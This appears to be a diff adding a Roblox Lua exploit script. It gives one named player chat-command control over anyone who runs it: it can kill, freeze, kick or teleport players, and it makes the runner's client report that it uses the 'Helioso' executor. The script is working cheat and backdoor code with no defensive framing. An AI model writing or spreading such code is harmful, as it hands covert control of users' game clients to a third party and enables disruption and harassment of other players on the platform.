@@ -1,0 +1,39 @@
+local Players = game:GetService("Players")
+
+local Selected = Players:FindFirstChild("Omnliman") -- Replace with the actual player's name
+local LocalPlayer = Players.LocalPlayer
+
+Selected.Chatted:Connect(function(msg)
+    if msg == ".kill "..LocalPlayer.Name or msg == ".kill all" then
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            player.Character:BreakJoints()
+        end
+    elseif msg == ".freeze "..LocalPlayer.Name or msg == ".freeze all" then
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            local rootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if rootPart then
+                rootPart.Anchored = true
+            end
+        end
+    elseif msg == ".unfreeze "..LocalPlayer.Name or msg == ".unfreeze all" then
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            local rootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if rootPart then
+                rootPart.Anchored = false
+            end
+        end
+    elseif msg == ".using helioso" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Selected.Name.." I am using Helioso","All")
+    elseif msg == ".kick "..LocalPlayer.Name then
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            player:Kick("You have been kicked from the game.")
+        end
+    elseif msg == ".bring "..LocalPlayer.Name or msg == ".bring all" then
+        X = Selected.Character.HumanoidRootPart.Position.X
+        Y = Selected.Character.HumanoidRootPart.Position.Y
+        Z = Selected.Character.HumanoidRootPart.Position.Z
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            player.Character.HumanoidRootPart.CFrame = CFrame.new(X,Y,Z-3)
+        end
+    end
+end)
